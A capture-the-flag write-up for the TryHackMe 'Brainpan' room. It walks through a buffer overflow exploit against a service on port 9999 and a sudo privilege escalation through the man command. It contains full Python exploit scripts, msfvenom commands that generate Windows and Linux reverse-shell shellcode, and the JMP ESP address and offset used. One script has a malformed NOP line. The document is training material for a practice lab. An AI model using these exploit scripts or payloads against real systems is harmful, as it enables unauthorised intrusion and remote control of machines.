# TryHackMe - Brainpan

## NMAP

```bash
Nmap scan report for 10.10.31.125
Host is up (0.18s latency).
Not shown: 64659 closed tcp ports (reset), 874 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?                                                                
| fingerprint-strings:      
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

From the nmap scan we can see on port 9999 it's running something and asking for input and on port 10000 it's running a python server 

## PORT 10000 (HTTP)

<img src="https://i.imgur.com/UpP8KCm.png"/>

It's a simple web page, so let's fuzz for files and directories here

<img src="https://i.imgur.com/RK1barp.png"/>

This found a directory named `/bin`

<img src="https://i.imgur.com/iF97LFo.png"/>

And here it's an exe named `brainpan.exe` which must be running on port 9999, so we need to transfer this on windows machine and try to first exploit it locally 

Running `file` on the exe we can see which binary this is 

<img src="https://i.imgur.com/fhyzSXG.png"/>

## Spiking

After running it and trying to cause a crash in the application

<img src="https://i.imgur.com/pBRuCuv.png"/>

It is vulnerable to buffer overlflow, so now we need to use immunity debugger and perform the steps to overflow the application 

## Fuzzing

Let's make script to cause a buffer overflow in the application

```python
#!/usr/bin/python

import socket

host = "192.168.0.113"
port = 9999

buffer = "A" * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()
```

<img src="https://i.imgur.com/P8ILF7m.png"/>

## Finding the offset
<img src="https://i.imgur.com/LZaXpyF.png"/>

We can see the `EIP` register having the value 414141 which are just bunch of A's, we need to find exaclty where the application crashed for that we need to know the offset so we can control the EIP to go to next instruction to execute commands and in order to find that we can generate a random pattern of strings using `msf-pattern_create`

<img src="https://i.imgur.com/X4qtyAp.png"/>

Replace these strings with the A's in the script

<img src="https://i.imgur.com/WeOvnyP.png"/>

After running this script, the EIP is going to hold a different value which is `35724134`

<img src="https://i.imgur.com/nANUO8E.png"/>

Using `msf-pattern-offset` we can identify the offset by providing the EIP value 

<img src="https://i.imgur.com/Cpf2GVt.png"/>

We now know that if we send the input `A * 524` it will cause an overflow,  let's try to overwrite the EIP with 4 D's to see if we can control EIP with any value we want 

```python
#!/usr/bin/python

import socket

host = "192.168.0.130"
port = 9999

buffer = "A" * 524 + "D" * 4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()

```
<img src="https://i.imgur.com/kv0DxAV.png"/>

The EIP has the value `44444444` which from hex converts to DDDD

## Identifying Bad Characters

Now the next step is to identify the bad characters for that we can just copy those characters from here

 https://github.com/cytopia/badchars

<Img src="https://i.imgur.com/rCQVgUb.png"/>

Run this script and the right click on `ESP`  and `Follow Dump`

<img src="https://i.imgur.com/gMtgfg9.png"/>

To identify bad characters, if there's any number missing like 01 it is considered as bad character but there aren't any missing characters from the input that we just sent so no bad characters

<img src="https://i.imgur.com/GfVkdyz.png"/>

## Finding the JMP instruction

Now we need to find the jump instruction `JMP` which is telling the stack to go jump to an address, we need to find address of this instruction so that we can make the stack jump to our instruction for calling a reverse shell

For finding the jmp instruction we can use a python script called `mona`

[https://github.com/corelan/mona](https://github.com/corelan/mona)

This script can loaded by placing it in Immunitiy debugger's `PyCommands` and can be loaded with `!mona`

<img src="https://i.imgur.com/dbIvIRd.png"/>

Running `!mona jmp -r esp`  we can identify the jmp instruction in the exe

<img src="https://i.imgur.com/GDvVUzr.png"/>

We get only one jmp instruction `0x311712f3`


## Getting a reverse shell

Now we need to just generate a windows 32 bit reverse shell payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=2222 EXITFUNC=thread -f python -b "\x00" 
```

<img src="https://i.imgur.com/0VkOqSs.png"/>

```python
#!/usr/bin/python                                                                        
import socket                                                                                  
host = "192.168.0.139"
port = 9999

buf =  b""                                                              
buf += b"\xba\x97\x93\x0e\x39\xda\xc9\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\xc0\x9d\xec"
buf += b"\xcc\x12\x49\x72\x2e\xea\x8a\x13\xa6\x0f\xbb\x13\xdc"
buf += b"\x44\xec\xa3\x96\x08\x01\x4f\xfa\xb8\x92\x3d\xd3\xcf"
buf += b"\x13\x8b\x05\xfe\xa4\xa0\x76\x61\x27\xbb\xaa\x41\x16"
buf += b"\x74\xbf\x80\x5f\x69\x32\xd0\x08\xe5\xe1\xc4\x3d\xb3"
buf += b"\x39\x6f\x0d\x55\x3a\x8c\xc6\x54\x6b\x03\x5c\x0f\xab"
buf += b"\xa2\xb1\x3b\xe2\xbc\xd6\x06\xbc\x37\x2c\xfc\x3f\x91"
buf += b"\x7c\xfd\xec\xdc\xb0\x0c\xec\x19\x76\xef\x9b\x53\x84"
buf += b"\x92\x9b\xa0\xf6\x48\x29\x32\x50\x1a\x89\x9e\x60\xcf"
buf += b"\x4c\x55\x6e\xa4\x1b\x31\x73\x3b\xcf\x4a\x8f\xb0\xee"
buf += b"\x9c\x19\x82\xd4\x38\x41\x50\x74\x19\x2f\x37\x89\x79"
buf += b"\x90\xe8\x2f\xf2\x3d\xfc\x5d\x59\x2a\x31\x6c\x61\xaa"
buf += b"\x5d\xe7\x12\x98\xc2\x53\xbc\x90\x8b\x7d\x3b\xd6\xa1"
buf += b"\x3a\xd3\x29\x4a\x3b\xfa\xed\x1e\x6b\x94\xc4\x1e\xe0"
buf += b"\x64\xe8\xca\xa7\x34\x46\xa5\x07\xe4\x26\x15\xe0\xee"
buf += b"\xa8\x4a\x10\x11\x63\xe3\xbb\xe8\xe4\xcc\x94\xf2\x77"
buf += b"\xa4\xe6\xf2\x7f\x9b\x6e\x14\x15\xf3\x26\x8f\x82\x6a"
buf += b"\x63\x5b\x32\x72\xb9\x26\x74\xf8\x4e\xd7\x3b\x09\x3a"
buf += b"\xcb\xac\xf9\x71\xb1\x7b\x05\xac\xdd\xe0\x94\x2b\x1d"
buf += b"\x6e\x85\xe3\x4a\x27\x7b\xfa\x1e\xd5\x22\x54\x3c\x24"
buf += b"\xb2\x9f\x84\xf3\x07\x21\x05\x71\x33\x05\x15\x4f\xbc"
buf += b"\x01\x41\x1f\xeb\xdf\x3f\xd9\x45\xae\xe9\xb3\x3a\x78"
buf += b"\x7d\x45\x71\xbb\xfb\x4a\x5c\x4d\xe3\xfb\x09\x08\x1c"
buf += b"\x33\xde\x9c\x65\x29\x7e\x62\xbc\xe9\x9e\x81\x14\x04"
buf += b"\x37\x1c\xfd\xa5\x5a\x9f\x28\xe9\x62\x1c\xd8\x92\x90"
buf += b"\x3c\xa9\x97\xdd\xfa\x42\xea\x4e\x6f\x64\x59\x6e\xba"

buffer = "A" * 524 + "\xf3\x12\x17\x31" + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()


```

If we run this we don't get a shell

<img src="https://i.imgur.com/ajvikzD.png"/>

Because we need to add a few NOPs (no operation) in our payload which can be done with `x90` ,NOP instructions simply just  slide the program execution to the next memory address

```python
#!/usr/bin/python                                                                        
import socket                                                                                  
host = "192.168.0.139"
port = 9999

buf =  b""                                                            
buf += b"\xba\x97\x93\x0e\x39\xda\xc9\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x57\x12\x83\xef\xfc\x03\xc0\x9d\xec"
buf += b"\xcc\x12\x49\x72\x2e\xea\x8a\x13\xa6\x0f\xbb\x13\xdc"
buf += b"\x44\xec\xa3\x96\x08\x01\x4f\xfa\xb8\x92\x3d\xd3\xcf"
buf += b"\x13\x8b\x05\xfe\xa4\xa0\x76\x61\x27\xbb\xaa\x41\x16"
buf += b"\x74\xbf\x80\x5f\x69\x32\xd0\x08\xe5\xe1\xc4\x3d\xb3"
buf += b"\x39\x6f\x0d\x55\x3a\x8c\xc6\x54\x6b\x03\x5c\x0f\xab"
buf += b"\xa2\xb1\x3b\xe2\xbc\xd6\x06\xbc\x37\x2c\xfc\x3f\x91"
buf += b"\x7c\xfd\xec\xdc\xb0\x0c\xec\x19\x76\xef\x9b\x53\x84"
buf += b"\x92\x9b\xa0\xf6\x48\x29\x32\x50\x1a\x89\x9e\x60\xcf"
buf += b"\x4c\x55\x6e\xa4\x1b\x31\x73\x3b\xcf\x4a\x8f\xb0\xee"
buf += b"\x9c\x19\x82\xd4\x38\x41\x50\x74\x19\x2f\x37\x89\x79"
buf += b"\x90\xe8\x2f\xf2\x3d\xfc\x5d\x59\x2a\x31\x6c\x61\xaa"
buf += b"\x5d\xe7\x12\x98\xc2\x53\xbc\x90\x8b\x7d\x3b\xd6\xa1"
buf += b"\x3a\xd3\x29\x4a\x3b\xfa\xed\x1e\x6b\x94\xc4\x1e\xe0"
buf += b"\x64\xe8\xca\xa7\x34\x46\xa5\x07\xe4\x26\x15\xe0\xee"
buf += b"\xa8\x4a\x10\x11\x63\xe3\xbb\xe8\xe4\xcc\x94\xf2\x77"
buf += b"\xa4\xe6\xf2\x7f\x9b\x6e\x14\x15\xf3\x26\x8f\x82\x6a"
buf += b"\x63\x5b\x32\x72\xb9\x26\x74\xf8\x4e\xd7\x3b\x09\x3a"
buf += b"\xcb\xac\xf9\x71\xb1\x7b\x05\xac\xdd\xe0\x94\x2b\x1d"
buf += b"\x6e\x85\xe3\x4a\x27\x7b\xfa\x1e\xd5\x22\x54\x3c\x24"
buf += b"\xb2\x9f\x84\xf3\x07\x21\x05\x71\x33\x05\x15\x4f\xbc"
buf += b"\x01\x41\x1f\xeb\xdf\x3f\xd9\x45\xae\xe9\xb3\x3a\x78"
buf += b"\x7d\x45\x71\xbb\xfb\x4a\x5c\x4d\xe3\xfb\x09\x08\x1c"
buf += b"\x33\xde\x9c\x65\x29\x7e\x62\xbc\xe9\x9e\x81\x14\x04"
buf += b"\x37\x1c\xfd\xa5\x5a\x9f\x28\xe9\x62\x1c\xd8\x92\x90"
buf += b"\x3c\xa9\x97\xdd\xfa\x42\xea\x4e\x6f\x64\x59\x6e\xba"

buffer = "A" * 524 + "\xf3\x12\x17\x31" + "x\90" + 30 +  buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()
```

<img src="https://i.imgur.com/kFeC6Jq.png"/>

We got our reverse shell now we need to deliver this on to the actual target, for getting a shell on the target machine we just need to replace the IP address 

## Foothold

<img src="https://i.imgur.com/MxDTPHj.png"/>

<img src="https://i.imgur.com/7z2PXrL.png"/>

After getting a shell, it was weird that I got a prompt saying `CMD Version 1.4.1` and there was a bash script which was executing the brainpan.exe using `wine` which tells that this is actually a linux machine running a windows exe , so we need to generate a linux reverse shell payload 

<img src="https://i.imgur.com/oiMNCSI.png"/>

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=2222 -f python EXITFUNC=thread -b "\x00" 
```

<img src="https://i.imgur.com/e25OqC6.png"/>

```python
#!/usr/bin/python

import socket

host = "10.10.252.161"
port = 9999

buf =  b""
buf += b"\xba\x5c\x45\x76\xc9\xda\xc4\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04\x03\x0a\x4b\x94"
buf += b"\x3c\x83\x88\xaf\x5c\xb0\x6d\x03\xc9\x34\xfb\x42\xbd"
buf += b"\x5e\x36\x04\x2d\xc7\x78\x3a\x9f\x77\x31\x3c\xe6\x1f"
buf += b"\xc8\xb6\x46\xe3\xa4\xc4\x76\x13\x9b\x40\x97\x93\x85"
buf += b"\x02\x09\x80\xfa\xa0\x20\xc7\x30\x26\x60\x6f\xa5\x08"
buf += b"\xf6\x07\x51\x78\xd7\xb5\xc8\x0f\xc4\x6b\x58\x99\xea"
buf += b"\x3b\x55\x54\x6c"

buffer = "A" * 524 + "\xf3\x12\x17\x31" +"\x90" * 30 + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()

```

<img src="https://i.imgur.com/G4rNDM1.png"/>

Now we got a linux shell and we can stabilize it with python3. Running `sudo -l ` we can see that the user `phuck` can execute `anansi_util` as root user

<img src="https://i.imgur.com/gq6Qxaw.png"/>

## Privilege Escalation
We have 3 commands to run , `ip a` which will show network interfaces, `proclist` will run `ps` to view the proc files and `man` command will be ran through manual

<img src="https://i.imgur.com/0tMNpEC.png"/>

Here we can't exploit PATH variable as there's an `env_reset`

https://news.ycombinator.com/item?id=5306099

But there's an privesc for man command if we look at GTFOBINS

https://gtfobins.github.io/gtfobins/man/

<Img src="https://i.imgur.com/A94uOhR.png"/>

```bash
sudo /home/anansi/bin/anansi_util manual man
```

<img src="https://i.imgur.com/jBTtW7A.png"/>

<img src="https://i.imgur.com/e4Zmr73.png"/>

## References

- https://github.com/cytopia/badchars
- https://news.ycombinator.com/item?id=5306099
- https://gtfobins.github.io/gtfobins/man/
